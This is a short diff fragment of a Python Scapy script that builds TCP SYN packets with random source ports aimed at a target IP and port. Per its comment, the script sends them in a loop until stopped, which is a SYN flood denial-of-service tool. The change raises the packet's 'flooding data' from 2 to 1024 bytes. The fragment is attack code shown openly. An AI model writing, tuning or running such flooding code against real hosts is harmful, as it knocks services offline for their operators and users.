@@ -20,7 +20,7 @@ ip = IP(dst=target_ip)
 tcp = TCP(sport=RandShort(), dport=target_port, flags="S")
 # add some flooding data (1KB in this case, don't increase it too much, 
 # otherwise, it won't work.)
-raw = Raw(b"X"*2)
+raw = Raw(b"X"*1024)
 # stack up the layers
 p = ip / tcp / raw
 # send the constructed packet in a loop until CTRL+C is detected 
